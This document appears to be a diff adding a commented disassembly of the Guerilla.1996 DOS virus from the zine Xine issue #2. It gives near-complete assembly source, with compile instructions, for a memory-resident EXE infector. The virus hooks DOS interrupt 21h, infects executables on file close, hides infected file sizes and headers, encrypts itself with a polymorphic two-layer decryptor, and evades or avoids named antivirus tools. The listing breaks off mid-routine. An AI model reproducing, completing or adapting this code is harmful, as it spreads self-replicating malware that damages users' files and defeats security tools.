@@ -1,0 +1,1422 @@
+   ;                                        /-----------------------------\
+   ;                                        | Xine - issue #2 - Phile 032 |
+   ;                                        \-----------------------------/
+
+
+   ;
+   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
+   ;ÛÛ                                                  ÛÛ
+   ;ÛÛ                      GUERILLA 1996 Disassembly                       ÛÛ
+   ;ÛÛ                             by b0z0/iKx                              ÛÛ
+   ;ÛÛ                                                                      ÛÛ
+   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
+   ;
+   ; Virus Name    : Guerilla 1996
+   ; Virus Author  : PH (?)
+   ; Virus Lenght  : 1996
+   ; Virus Type    : TSR EXE infector, Full stealth, Polymorphic
+   ; Hooked Ints   : 21h
+   ; Hooked Funcs. : 09h,11h,12h,32h,3Dh,3Eh,4Bh,4Ch,4Eh,4Fh,6Ch
+   ; Infect on     : Close (3Eh)
+   ; Payloads      : None
+   ; Compiling     : Use TASM 3.0 to get the original Guerilla.1996
+   ;                       TASM guerilla.asm
+   ;                       TLINK guerilla
+   ;                 Other compilers may not exactly reproduce the first gen.
+   ; AV report     :
+   ;                       TBScan 7.06: '#' flag on all infected files
+   ;                       Fprot 2.26: Detect it. (from 2.26 up)
+   ;                       AVP 2.22 (updated bases): Nothing
+   ;                             - The virus is (for what AVP says :) )
+   ;                               found with an updated base for AVP 3.0b...
+   ;
+   ; For more informations (for example about the poly and infection
+   ; method) check around the code! I prefeered to put some long comments and
+   ; major explanations at the parts that are more interesting instead of
+   ; writing 500 lines of intro ;-)
+   ;
+
+
+   virus_lenght            equ     (virus_end-virus_start)
+   virus_lenght_para       equ     (((virus_lenght + 10h)/10h)+1)
+   virus_lenght_file       equ     (virus_end_file-virus_start)
+   first_enc_lenght        equ     (first_encr_end-first_encr_start+1)
+   second_encrypt_lenght   equ     (end_second_encrypt-start_second_encrypt)
+
+   ;-------------------------------------------------------  guerilla   ----
+
+   guerilla           segment byte public
+                      assume cs:guerilla  , ds:guerilla
+
+   ; Virus Entry Point
+
+   virus_start:
+   start:
+                   mov     bp,0                    ; Delta offset in BP
+   fill_poly_3:
+                   mov     al,5
+                   mov     ah,3
+   fill_poly_5:
+                   and     bx,0
+           nop
+                   int     16h                     ; Fool Tbscan
+   fill_poly_6:
+                   mov     si,bp
+           clc             ; Clear carry flag
+           nop
+                   call    first_layer_enc         ; Decryption routine
+
+   ; Everything after this line up to first_encr_end will be encrypted by
+   ; the first encryption routine
+
+   first_encr_start:
+                   push    ds
+           clc             ; Clear carry flag
+                   call    second_encr             ; Second Decryption routine
+
+   ; Everything after this line up to enc_second_encrypt will be encrypted by
+   ; the second encryption routine
+
+   start_second_encrypt:
+
+                   mov     ah,30h
+                   int     21h                     ; get DOS version in al
+
+                   cmp     al,5                    ; Runs only on DOS 5 or
+                   jae     ok_dos_version          ; higher
+                   jmp     resume_orig_exe
+   ok_dos_version:
+           push    cs
+           pop ds
+
+                   lea     dx,[bp+dollar_char]     ; DS:DX points on '$'
+                   mov     ah,9                    ; Write a char
+                   int     21h
+
+                   cmp     bx,3135h                ; Residency check
+                   je      resume_orig_exe         ; Go away if resident!
+
+                   sub     ax,ax
+                   mov     ds,ax                   ; DS=0 -> to IVT
+
+                   push    word ptr ds:[21h*04h] ; Push Int21h offset
+                   push    word ptr ds:[21h*04h] ; Push Int21h offset
+                   push    word ptr ds:[21h*04h+02h]  ; Push Int21h segment
+                   push    word ptr ds:[21h*04h+02h]  ; Push Int21h segment
+                   pop     word ptr cs:[sec_int21_segment+bp]   ; Save segment
+                   pop     word ptr cs:[fir_int21_segment+bp]   ; Save segment
+                   pop     word ptr cs:[sec_int21_offset+bp]    ; Save offset
+                   pop     word ptr cs:[fir_int21_offset+bp]    ; Save offset
+
+                   xor     di,di                   ; DI = 0
+                   call    tsr_av_check            ; Look for TSR AVs
+                   jz      resume_orig_exe         ; If Z then an AV is resident
+
+                   mov     ax,es                   ; ES Last memory block
+                   dec     ax                      ; AX on MCB
+           push    ax
+           pop ds
+
+                   inc     di
+           mov al,[di-1]
+                   cmp     al,'N'                  ; Is the last MCB?
+                   jl      resume_orig_exe         ; Less -> No, go away
+
+                   mov     bx,[di+2]               ; Lenght of the MB
+                   sub     bx,virus_lenght_para    ; Substract our lenght
+                   jc      resume_orig_exe
+
+                   mov     ax,[di+11h]             ; DI+11h = PSP + 02h
+                   sub     ax,virus_lenght_para    ; That is segment limit
+                   mov     [di+2],bx               ; Put new lenght in MCB
+                   mov     [di+11h],ax             ; and in the PSP
+
+                   mov     es,ax
+           sub ax,ax
+                   mov     ds,ax                   ; DS on IVT
+                   cli
+                   mov     word ptr ds:[21h*04h],offset int21h_handler
+                   mov     ds:[21h*04h+02h],es     ; Set our int21h handler
+                   sti
+
+                   xor     di,di                   ; Copy to ES:DI, ES:0
+           push    cs
+           pop ds
+           cld             ; Clear direction
+                   mov     cx,virus_lenght         ; Number of bytes to copy
+
+                   db      8dh,0b6h,00h,00h        ; LEA si,[bp+0]
+                   rep     movsb                   ; Copy the virus in memory
+
+   resume_orig_exe:
+           pop ds
+           push    ds
+           pop es
+           mov ax,es
+
+                   db      83h,0c0h,10h            ; ADD ax,10h
+
+                   add     word ptr cs:[victim_cs+bp],ax
+
+                   db      81h,0c0h                ; ADD ax,_add_to_ax_
+   add_to_ax       db      00h,00h
+
+                   cli
+                   mov     sp,0            ; This will be changed in the
+                   mov     ss,ax           ; infection phase to reflect the
+                   sti                     ; original SS:SP
+
+                   sub     ax,ax           ; Zero all registers
+           sub bx,bx
+           sub cx,cx
+           sub dx,dx
+           sub si,si
+           sub di,di
+           sub bp,bp
+
+                   db      0EAh            ; Give control to the host
+   victim_ip       dw      0
+   victim_cs       dw      0FFF0h
+
+
+
+   ; Virus Int 21h handler
+   ;
+
+   int21h_handler:
+                   push    si
+                   pushf                           ; Push flags
+           xor si,si           ; Zero register
+   function_check_loop:
+                   cmp     ah,byte ptr cs:[hooked_services + si]
+                   jne     not_interesting_fc
+                   popf
+                   jmp     word ptr cs:[hooked_services + 1 + si]
+   not_interesting_fc:
+                   add     si,3                    ; Look trought our table
+                   cmp     si,21h                  ; if the service is of our
+                   jne     function_check_loop     ; interest
+                   popf
+           pop si
+                   jmp     jmp_to_old_int21h       ; Jump to old 21h handler
+
+   ; End of virus int 21h handler
+
+
+   ; Table with hooked services and respective jumps to it's procedure
+
+   hooked_services:
+                   db      4bh                     ; AH=4Bh - EXECUTE
+                   dw      offset int_execute
+                   db      4ch                     ; AH=4Ch - TERMINATE
+                   dw      offset int_execute
+                   db      09h                     ; AH=09h - VIRUS CHECK
+                   dw      offset int_virus_check
+                   db      11h                     ; AH=11h - FINDFIRST FCB
+                   dw      offset int_fcb_stealth
+                   db      12h                     ; AH=12h - FINDNEXT FCB
+                   dw      offset int_fcb_stealth
+                   db      4eh                     ; AH=4Eh - FINDFIRST DTA
+                   dw      offset int_dta_stealth
+                   db      4fh                     ; AH=4Fh - FINDNEXT DTA
+                   dw      offset int_dta_stealth
+                   db      3dh                     ; AH=3Dh - OPEN
+                   dw      offset int_open_stealth
+                   db      3eh                     ; AH=3Eh - CLOSE
+                   dw      offset int_close_infect
+                   db      6ch                     ; AH=6Ch - EXTENDED OPEN
+                   dw      offset int_open_stealth
+                   db      32h                     ; AH=32h - GET DPB
+                   dw      offset int_execute
+   end_hooked_services:
+
+   ;
+   ; Int_Execute is called on 4Bh (EXECUTE), 32h (Get DPB), 4Ch (TERMINATE).
+   ; If the call is a 4Bh then the virus will check if an antivirus or a
+   ; special program from it's table is running (ex. windoze) and if this
+   ; is true then it will totally disable stealth.
+   ; If the call is a 4Ch then the virus will simple reenable stealth.
+   ; If the call is a 32h (used by program such as CHKDSK) the virus will
+   ; disable stealth to evitate strange reports to the user.
+   ;
+
+   int_execute:
+                   push    ax
+                   push    bx
+                   push    di
+
+                   mov     di,(offset special_names - 1)
+                   mov     bx,di
+
+                   cmp     ah,32h                  ; Check which function
+                   je      disable_stealth
+                   cmp     ah,4ch
+                   je      enable_stealth
+
+                   mov     si,dx
+   search_dot:
+                   cmp     byte ptr [si],'.'       ; Is a dot?
+                   je      name_check              ; If so go to name_check
+                   cmp     byte ptr [si],0         ; End of the name?
+                   je      int_execute_exit        ; Exit if so
+           inc si
+                   jmp     short search_dot        ; Search the dot
+
+   ; Check if is one of the names in our table
+
+   name_check:
+                   dec     si                      ; On last filename letter
+                   inc     di                      ; Point on the non-infectable
+                   mov     al,cs:[di]              ; names table
+           cmp al,[si]
+                   je      name_check              ; If equal continue comp.
+                   cmp     al,' '                  ; finished our name?
+                   je      disable_stealth         ; EQ = yes, so disable st.
+                   add     bx,8                    ; Skip to next name
+           mov di,bx
+                   cmp     byte ptr cs:[di+1],0    ; finished table?
+                   jne     search_dot              ; No, continue search
+   enable_stealth:
+                   mov     byte ptr cs:stealth_enabled,1
+                   jmp     short int_execute_exit
+   disable_stealth:
+                   mov     byte ptr cs:stealth_enabled,0
+   int_execute_exit:
+           pop di
+           pop bx
+           pop ax
+           pop si
+                   jmp     jmp_to_old_int21h
+
+   ; When one of this programs is runned the virus will totally disable it's
+   ; stealth features.
+
+   special_names:
+                   db      'NACSBT  '              ; TBScan
+                   db      'NIW     '              ; Windows
+                   db      'PUTESBT '              ; TBSetup
+                   db      'PIZKP   '              ; PKZip
+                   db      'JRA     '              ; Arj
+                   db      'RAR     '              ; Rar
+                   db      'AHL     '              ; Lha
+                   db      'FNIDA   '              ; Adinf
+           db  0
+
+
+   ; The Int_close_infect is the routine that will infect a file that is
+   ; going to be closed using function 3Eh. Infection will be possible only
+   ; if:   - stealth is enabled (so no AV/compressor is running)
+   ;       - default drive is a fixed drive (to prevent big loss of time)
+   ;       - the handle is minor than 5. This is to be sure it is a file handle
+   ; The infection routine uses SFTs for some operations. Infected files are
+   ; longer than 5000 bytes and shorter than 383kb. Some AVs won't be infected.
+   ; The virus will of course also save the original EXE header for future
+   ; stealth. The original EXE header is encrypted with a 8-bit XOR with the
+   ; value of the time of the file.
+   ; The virus will put also a check in the EXE header that is calculated
+   ; from the original EXE. This is done by adding 17h to the new SS and then
+   ; by rol-ing by one. This calculated value will be used also as the random
+   ; number from which depends the poly routine. So the decryption routine and
+   ; the decryption values will be the same if two identical files are infected.
+   ; This may be considered quite funny, because may fool some AV homebrewers
+   ; that was triing to study the virus on a couple of identical goats :-)
+   ;  The poly engine isn't very complex. The decryptor has always some fixed
+   ; instructions at the same place, so i don't think it would be too hard to
+   ; get them. Random instructions are also put in some predefined places in
+   ; the decryptor. The random instructions aren't generated 'on the fly' but
+   ; rather selected from a table of suitable instructions. There are two layers
+   ; of encryption. The first is a ROL or ROR loop, the second is ADD or SUB
+   ; loop. It is quite interesting that the virus when encrypting the body
+   ; to infect a file doesn't need another extra space, but will encrypt itself
+   ; in memory and will just leave of course the decryptor, a routine that
+   ; writes the encrypted body to the file and a call to the decryptor that
+   ; will decrypt again the body in memory.
+   ;  In addition to try to make the life of avw more difficoult the virus
+   ; will put on the tail of the infected host a random number of bytes. This
+   ; random number of bytes is a derivate from the file time, so the virus
+   ; will be able to know how much stuff did it put when it will stealth the
+   ; virus size.
+   ;
+
+
+   int_close_infect:
+                   push    ax                      ; Save registers
+                   push    bx
+                   push    cx
+                   push    dx
+                   push    di
+                   push    es
+                   push    ds
+                   pushf
+                   push    cs
+                   pop     ds
+
+                   cmp     bl,05h                  ; Only handles < 05h
+                   jnb     seems_an_ok_handle      ; To be sure it is a file
+                   jmp     int_close_exit
+   seems_an_ok_handle:
+                   call    get_default_dr          ; Infect only if the curr.
+                   jnb     ok_default_dr           ; default drive is > B:
+                   jmp     int_close_exit
+   ok_default_dr:
+                   cmp     byte ptr cs:stealth_enabled,0   ; Stealth enabled?
+                   jne     stealth_is_enabled      ; Continue if it is
+                   jmp     int_close_exit
+   stealth_is_enabled:
+                   call    get_sft
+                   mov     ds:[sft_es],es
+                   mov     ds:[sft_di],di              ; Check if it is an EXE
+                   cmp     word ptr es:[di+28h],'XE'
+                   je      seems_an_exe
+                   jmp     int_close_exit
+   seems_an_exe:
+                   cmp     byte ptr es:[di+2Ah],'E'
+                   je      is_an_exe               ; Well, it is a .EXE
+                   jmp     int_close_exit
+   is_an_exe:
+                   call    check_filetime          ; Check file time
+                   jnz     ok_time                 ; NZ -> Not our timemarker
+                   jmp     int_close_exit
+   ok_time:
+                   call    seek_woff               ; Go to start of the file
+
+                   nosmart
+                   lea     dx,exe_header_space     ; Point the header buffer
+                   smart
+
+                   call    read_header             ; Read EXE header
+                   jnc     read_header_passed      ; Jump if no errors
+                   jmp     int_close_exit
+   read_header_passed:
+                   cmp     word ptr [si+18h],40h   ; Is a WinExe?
+                   jne     no_winexe
+                   jmp     int_close_exit
+   no_winexe:
+                   mov     ah,[si]                 ; First header byte
+                   xor     ah,4Dh                  ; 'M'. MZ exe check
+                   jz      first_byte_exe          ; Zero if is 'M'
+                   jmp     int_close_exit
+   first_byte_exe:
+                   mov     ax,[si+12h]             ; On checksum is our
+                   ror     ax,1                    ; infection check.
+
+                   db      83h,0e8h,17h            ; SUB ax,17h
+
+                   cmp     ax,[si+0Eh]             ; Infection check in header
+                   jne     not_equal_check         ; NE -> Not infected
+                   jmp     int_close_exit          ; If infected go away
+   not_equal_check:
+                   mov     ax,4202h                ; Go to end of file
+                   xor     cx,cx
+                   cwd                             ; DX:CX = 0
+                   call    do_orig_int21h          ; do the int 21h
+                   mov     lenght_dx,dx            ; Store lenght
+                   mov     lenght_ax,ax
+                   or      dx,dx                   ; Shorter than 64k?
+                   jz      check_ax_lenght         ; If so do another check
+           cmp dx,5
+                   jbe     ok_dx_lenght            ; Ok if shorter than 383k
+                   jmp     int_close_exit
+   ok_dx_lenght:
+                   jmp     short ok_axdx_lenght
+   check_ax_lenght:
+                   cmp     ax,5000d                ; Shorter than 5000 bytes?
+                   jae     ok_axdx_lenght
+                   jmp     int_close_exit          ; If shorter then go away!
+   ok_axdx_lenght:
+                   mov     ax,[si+4]               ; Check for overlays
+           mov cx,200h
+                   mul     cx                      ; Calculate the lenght
+                   mov     cx,[si+2]               ; of the EXE from the
+                   or      cx,cx                   ; header data
+                   jz      no_last_page_c
+           sub ax,200h
+           sbb dx,0
+                   add     ax,cx                   ; Add Last Page count
+           adc dx,0
+   no_last_page_c:
+                   cmp     ax,lenght_ax            ; Compare header and real
+                   je      eq_ax_lenght            ; lenght of the file
+                   jmp     int_close_exit          ; Go away if different
+   eq_ax_lenght:
+                   cmp     dx,lenght_dx            ; Compare header and real
+                   je      eq_dx_lenght            ; lenght of the file
+                   jmp     int_close_exit          ; Go away if different
+   eq_dx_lenght:
+                   mov     dx,es:[di+20h]          ; DX=first two letters of
+                                                   ; the filename of the program
+                                                   ; being infected
+                   nosmart
+                   lea     si,av_names             ; Point to non infectables
+                   smart
+
+                   mov     cx,0Dh
+
+   av_name_loop:
+                   lodsw                           ; Get next AV
+                   cmp     ax,dx                   ; Compare two letters
+                   jne     no_current_av           ; Not equal go to next AV
+                   jmp     int_close_exit          ; Equal exit infection
+   no_current_av:
+                   loop    av_name_loop            ; Loop trought all AVs
+
+           push    ds
+           pop es
+
+                   nosmart                         ; Point on IP
+                   lea     si,(exe_header_space + 14h)
+                   lea     di,victim_ip            ; Space for old IP
+                   smart
+
+                   movsw                           ; Save original CS and IP
+                   movsw
+                   sub     si,0Ah                  ; Point on original SS
+
+                   nosmart
+                   lea     di,add_to_ax
+                   smart
+
+                   movsw                           ; Save SS
+                   inc     di                      ; Point to "mov sp,0"
+           inc di
+                   movsw                           ; Save SP
+                   sub     si,12h                  ; SI = 0
+           push    si
+
+                   nosmart
+                   lea     di,head_buffer
+                   smart
+
+                   cld                             ; Copy EXE header to our
+                   mov     cx,18h                  ; head_buffer
+                   rep     movsb
+           pop si
+
+
+                   mov     ax,5700h                ; Get file's Date and Time
+                   call    do_orig_int21h          ; Call int 21h
+                   mov     file_time,cx            ; Store Date and Time
+                   mov     file_date,dx
+
+                   call    encrypt_header          ; Encrypt EXE header
+
+                   mov     es,sft_es               ; ES:DI -> SFT entry
+                   mov     di,sft_di
+
+                   mov     ax,lenght_ax
+                   mov     dx,lenght_dx
+                   mov     es:[di+15h],ax          ; Put new position in the
+                   mov     es:[di+17h],dx          ; SFT entry
+
+                   mov     cx,10h
+                   div     cx                      ; Calculate new CS:IP
+                   inc     si                      ; for the infected file
+           sub ax,[si+7]
+           sbb dx,0
+
+                   mov     [si+15h],ax             ; Put new CS:IP in the
+                   mov     [si+13h],dx             ; EXE header
+
+                   mov     word ptr ds:[1],dx      ; Put new "delta offset"
+                                                   ; in the first line of
+                                                   ; code for future
+           inc ax
+                   mov     [si+0Dh],ax             ; Put new SS
+
+                   db      83h,0c0h,17h            ; ADD ax,17h
+
+                   rol     ax,1                    ; Calculate marker
+                   mov     [si+11h],ax             ; Put marker
+
+                   mov     inf_marker,ax           ; Get random number from
+                   and     al,0Fh                  ; our infection marker
+                   or      al,al                   ; Zero?
+                   jnz     no_al_increment
+                   inc     al                      ; At least 1 for rotating
+   no_al_increment:
+                   mov     byte ptr ds:[first_rand],al     ; Store random
+                   mov     byte ptr ds:[second_rand],al    ; bytes. In
+                   mov     ch,10h                          ; first_rand_beta
+                   sub     ch,al                           ; will be stored
+                   mov     byte ptr ds:[first_rand_beta],ch; the opposite
+
+                   test    al,1                        ; Decide if ROR or ROL
+                   jnz     do_the_ror
+                   mov     byte ptr rotate_oper,0C0h   ; Put ROL
+                   mov     byte ptr reg8ch1,5          ; And use AL
+                   mov     byte ptr reg8ch2,5
+                   jmp     short proceed_enc
+   do_the_ror:
+                   mov     byte ptr rotate_oper,0CCh   ; Put ROR
+                   mov     byte ptr reg8ch1,25h        ; And use AH
+                   mov     byte ptr reg8ch2,25h
+   proceed_enc:
+                   mov     word ptr [si+0Fh],0     ; put new SP = 0
+
+                   db      81h,44h,09h,7dh,00h     ; ADD word ptr [si+9],7Dh
+                                                   ; Add 7Dh to MinAlloc
+
+
+   ; The code after this line changes the decryptor using some predefinited
+   ; opcodes stored in a table. The various src_fill_* are the labels for
+   ; the source bytes from which will be selected some to change the decryptor.
+   ; The fill_poly_* are the places where foo instructions will be put.
+   ; So DI will carry various places to fill with garbage instructions and
+   ; SI will point on suitable instructions for that place. copy_poly_b will
+   ; fill some place at DI with some random stuff from SI (or near SI).
+   ;
+
+                   push    si
+           push    di
+           push    bx
+           mov bx,3
+
+                   nosmart
+                   lea     si,enc_table_start
+                   lea     di,fill_poly_1
+                   smart
+                   call    copy_poly_b
+
+                   nosmart
+                   lea     di,fill_poly_2
+                   smart
+                   call    copy_poly_b
+
+                   nosmart
+                   lea     si,src_fill_3
+                   lea     di,fill_poly_3
+                   smart
+                   call    copy_poly_b
+
+                   nosmart
+                   lea     si,src_fill_4
+                   lea     di,fill_poly_4
+                   smart
+                   call    copy_poly_b
+
+                   nosmart
+                   lea     si,src_fill_5
+                   lea     di,fill_poly_5
+                   smart
+                   call    copy_poly_b
+
+                   nosmart
+                   lea     si,src_fill_6
+                   lea     di,fill_poly_6
+                   smart
+                   call    copy_poly_b
+
+                   nosmart
+                   lea     si,src_fill_7
+                   lea     di,fill_poly_7
+                   smart
+                   call    copy_poly_b
+
+                   nosmart
+                   lea     si,src_fill_8
+                   lea     di,fill_poly_8
+                   smart
+                   call    copy_poly_b
+
+                   nosmart
+                   lea     si,src_fill_9
+                   lea     di,fill_poly_9
+                   smart
+                   call    copy_poly_b
+
+                   mov     bx,2
+
+                   nosmart
+                   lea     si,src_fill_10
+                   lea     di,fill_poly_10
+                   smart
+                   call    copy_poly_b
+
+                   nosmart
+                   lea     si,src_fill_11
+                   lea     di,fill_poly_11
+                   smart
+                   call    copy_poly_b
+
+                   nosmart
+                   lea     si,src_fill_12
+                   lea     di,fill_poly_12
+                   smart
+                   call    copy_poly_b
+
+   ; End of decryptor modification
+
+                   pop     bx
+           pop di
+           pop si
+
+                   call    modify_time
+                   add     cx,virus_lenght_file    ; CX = bytes to write
+                   mov     ah,40h                  ; Will write
+           push    si
+           push    di
+           push    es
+                   call    enc_dec_copy            ; Encrypt ourselves, write
+                   pop     es                      ; to a file and also of
+                   pop     di                      ; course decrypt
+           pop si
+
+                   mov     ax,lenght_ax            ; Calculate new EXE file
+                   mov     dx,lenght_dx            ; lenght
+                   add     ax,virus_lenght_file
+           adc dx,0
+           mov cx,200h
+                   div     cx
+                   or      dx,dx
+                   jz      no_page_fix
+           inc ax
+   no_page_fix:
+                   mov     [si+1],dx               ; Put new lenght in the
+                   mov     [si+3],ax               ; EXE header
+                   call    seek_woff               ; Go at start!
+
+                   nosmart
+                   lea     dx,exe_header_space
+                   smart
+
+                   call    write_header            ; Write new header
+
+                   mov     ax,5701h
+                   mov     cx,file_time            ; Restore file_time
+                   and     cx,0FFE0h               ; Put marker for stealth
+           or  cx,5
+                   mov     dx,file_date            ; and file_date
+                   call    do_orig_int21h
+
+   int_close_exit:
+           popf                ; Pop flags
+           pop ds
+           pop es
+           pop di
+           pop dx
+           pop cx
+           pop bx
+           pop ax
+           pop si
+                   jmp     jmp_to_old_int21h
+
+
+   ; Check if the virus is already in memory. This is checked at function
+   ; 09h (Write a string) when the string to write is only a '$'.
+   ;
+
+   int_virus_check:
+                   pop     si
+           push    di
+           mov di,dx
+                   cmp     byte ptr [di],'$'
+           pop di
+                   je      residency_call
+                   jmp     jmp_to_old_int21h
+   residency_call:
+           mov bx,3135h
+           iret                ; Interrupt return
+
+
+   ; Int_dta_stealth is the routine that manages the stealth on Findfirst
+   ; and Findnext (4Eh/4Fh) functions.
+   ;
+
+   int_dta_stealth:
+                   call    do_orig_int21h
+                   jc      exit_dta_stealth        ; Jump if Error
+
+                   cmp     byte ptr cs:stealth_enabled,0
+                   je      exit_dta_stealth        ; Jump if stealth disabled
+
+                   push    es
+           push    cx
+           push    bx
+           push    ax
+           push    di
+
+                   mov     ah,2Fh                  ; Get DTA
+                   call    do_orig_int21h
+
+                   xchg    di,bx
+           mov si,di
+                   add     di,16h                  ; Point DI to FileTime
+                   add     si,1Ah                  ; Point SI to FileSize
+
+                   call    mask_time               ; Check if it is infected
+                                                   ; and stealth size if it is
+                   pop     di
+           pop ax
+           pop bx
+           pop cx
+           pop es
+           clc             ; Clear carry flag
+
+   exit_dta_stealth:
+           pop si
+           retf    2           ; Return far
+
+
+   ; Int_fcb_stealth manages stealth on 11h/12h
+   ;
+
+   int_fcb_stealth:
+                   call    do_orig_int21h
+                   or      al,al                   ; Was 11h/12h successful?
+                   jnz     exit_11_12              ; If no go away
+
+                   cmp     byte ptr cs:stealth_enabled,0   ; Stealth enabled?
+                   je      exit_11_12                      ; No, go away
+
+                   push    es
+           push    cx
+           push    bx
+           push    ax
+           push    di
+
+                   mov     ah,2Fh                  ; Get DTA
+                   call    do_orig_int21h
+
+                   xchg    di,bx
+           mov bl,es:[di]
+                   xor     bl,0FFh                 ; Extended FCB?
+                   jnz     no_ext_fcb              ; No, no add
+                   add     di,7                    ; Yea, add 7
+   no_ext_fcb:
+           mov si,di
+                   add     di,17h                  ; Point DI on FileTime
+                   add     si,1Dh                  ; Point SI on FileSize
+                   call    mask_time               ; Check if infected and
+                   pop     di                      ; stealth size if it is
+           pop ax
+           pop bx
+           pop cx
+           pop es
+   exit_11_12:
+           pop si
+           iret                ; Interrupt return
+
+   ; mask_time will be called by both 11h/12h and 4Eh/4Fh stealth routines.
+   ; It assumes that es:[di] points on file time and es:[si] on filesize.
+   ; It will check the timestamp and, if the file will seem infected, will
+   ; hide the size. The foo bytes at the tail of the host are calculated
+   ; in the same way as before in the infection stage.
+   ;
+
+   mask_time       proc    near
+                   mov     ax,es:[di]              ; File time in AX
+                   mov     bx,ax                   ; File time in BX
+
+                   db      83h,0e0h,1fh            ; AND ax,1fh
+                   db      83h,0f0h,05h            ; XOR ax,05h
+
+                   jnz     it_isnt_infected
+                   mov     cl,5                    ; Get amount of garbage
+                   shr     bx,cl                   ; from the File Time
+                   and     bx,3Fh
+                   cmp     word ptr es:[si+2],0    ; Smaller than 64k ?
+                   jne     substract_lenght        ; No, so no second check
+           cmp word ptr es:[si],1388h
+                   jb      it_isnt_infected        ; We don't infect files
+                                                   ; smaller than 5000 bytes
+   substract_lenght:
+                   add     bx,virus_lenght_file
+                   sub     es:[si],bx              ; Hide virus lenght
+           sbb word ptr es:[si+2],0
+   it_isnt_infected:
+           retn
+   mask_time       endp
+
+   ; int_open_stealth is the stealth routine on OPEN (3Dh and 6Ch for extended
+   ; open). The virus will reput the original header and delete the virus
+   ; body at the end of the host.
+   ;
+
+   int_open_stealth:
+                   pop     si
+           push    ax
+           push    bx
+           push    cx
+                   push    dx                      ; Save regs
+           push    si
+           push    di
+           push    ds
+           push    es
+                   pushf
+                   cmp     ah,6Ch                  ; Extended open?
+                   jne     normal_open             ; No, normal
+                   mov     dx,si                   ; Yea, so put right register
+   normal_open:
+                   call    get_default_dr
+                   jnc     dfl_dr_ok               ; Jump if drive > B:
+                   jmp     int_open_end
+   dfl_dr_ok:
+                   cmp     byte ptr cs:stealth_enabled,0
+                   jne     ste_enabled             ; Jump if not stealthing
+                   jmp     int_open_end
+   ste_enabled:
+                   mov     ax,3D00h                ; Open file in RO mode
+                   call    do_orig_int21h
+                   jnc     ok_opening              ; Continue if no errors
+                   jmp     int_open_end
+   ok_opening:
+                   xchg    bx,ax                   ; File handle in BX
+           push    cs
+           pop ds
+
+                   call    get_sft
+
+                   cmp     word ptr es:[di+28h],'XE'   ; Is an exe?
+                   jne     int_open_end_wc         ; If not leave
+
+                   call    check_filetime          ; Our timestamp?
+                   jnz     int_open_end_wc         ; If not leave
+
+                   mov     ax,es:[di+11h]          ; Get file size
+           mov dx,es:[di+13h]
+
+                   mov     lenght_ax,ax            ; Store file size
+                   mov     lenght_dx,dx
+
+                   call    modify_time             ; Here the virus gets
+                                                   ; from the time how many
+                   add     cx,1Ch                  ; foo bytes have been put
+                                                   ; Add also 1Ch so we will
+                                                   ; point to the encrypted
+                                                   ; original EXE header
+                   sub     ax,cx                   ; Substract the foo bytes
+                                                   ; and the offset of the
+                                                   ; encrypted EXE header
+                   sbb     dx,0                    ; from the filesize
+                   mov     es:[di+15h],ax          ; Put current offset in file
+                   mov     es:[di+17h],dx          ; to our encrypted original
+                                                   ; EXE header
+                   nosmart
+                   lea     dx,head_buffer
+                   smart
+
+                   call    read_header             ; Read encrypted EXE header
+                   jc      int_open_end_wc         ; Exit on error
+                   call    encrypt_header          ; Decrypt the EXE header
+                   cmp     byte ptr [si],'M'       ; Seems ok?
+                   jne     int_open_end_wc         ; If not exit
+                   call    seek_woff               ; Go to file start
+                   call    write_header            ; Write the orignal header
+                   jc      int_open_end_wc         ; Exit on error
+                   mov     ax,lenght_ax            ; Get file lenght
+                   mov     dx,lenght_dx
+                   call    modify_time             ; Calculate foo bytes in CX
+                   add     cx,virus_lenght_file    ; Add virus lenght
+                   sub     ax,cx                   ; Substract virus size from
+                   sbb     dx,0                    ; file lenght
+                   mov     es:[di+15h],ax          ; DO IT!
+           mov es:[di+17h],dx
+                   mov     ah,40h                  ; Write to file
+                   xor     cx,cx                   ; CX=0, truncate file
+                   call    do_orig_int21h          ; Go
+                   mov     ax,5701h                ; Set file time/date
+                   mov     cx,file_time            ; Get original time/date
+                   mov     dx,file_date
+                   call    do_orig_int21h          ; Set original time/date
+   int_open_end_wc:
+                   mov     ah,3Eh                  ; Close file
+                   call    do_orig_int21h
+   int_open_end:
+           popf                ; Pop flags
+           pop es
+           pop ds
+           pop di
+           pop si
+           pop dx
+           pop cx
+           pop bx
+           pop ax
+
+   jmp_to_old_int21h:
+                           db      0EAh
+   fir_int21_offset        dw      00h
+   fir_int21_segment       dw      00h
+
+   ; tsr_av_check walks trought the memory control blocks and check if there
+   ; is an AV active in memory.
+   ;
+
+   tsr_av_check    proc    near
+           push    es
+           push    ds
+                   mov     ah,52h                  ; Get List of the Lists
+                   call    do_orig_int21h
+                   push    word ptr es:[bx-2]      ; Push segment of the first
+                   pop     ds                      ; MCB
+   mcb_checking:
+                   cmp     byte ptr [di],'M'       ; Isn't last block?
+                   je      examine_mem             ; It isn't, so jump
+                   cmp     byte ptr [di],'Z'       ; Is last block?
+                   jne     exit_av_mem_check       ; No, jump away
+   examine_mem:
+                   lea     si,[bp+av_mem_names]    ; Point on TSR AV table
+                   mov     cx,3                    ; 3 TSR AV in our table
+
+   mem_check_loop:
+                   mov     ax,[di+8]               ; Get program name
+                   cmp     ax,cs:[si]              ; It is equal than our AV?
+                   jne     continue_next_av
+                   mov     al,cs:[si+2]            ; Check the third char
+           cmp al,[di+0Ah]
+                   je      exit_av_mem_check       ; There is an AV in mem!
+                   cmp     al,'*'                  ; Wildcard in our table?
+                   je      exit_av_mem_check       ; So assume AV present!
+   continue_next_av:
+           add si,3
+                   loop    mem_check_loop          ; Loop if cx > 0
+
+           mov ax,ds
+                   add     ax,[di+3]               ; Add Memory Block size
+                   inc     ax                      ; On the next MCB
+                   mov     ds,ax                   ; Examine it!
+                   jmp     short mcb_checking
+
+   exit_av_mem_check:
+           pop ds
+           pop es
+           retn
+   tsr_av_check    endp
+
+
+   get_sft         proc    near
+           push    bx
+                   mov     ax,1220h                ; Get JFT entry
+                   int     2Fh
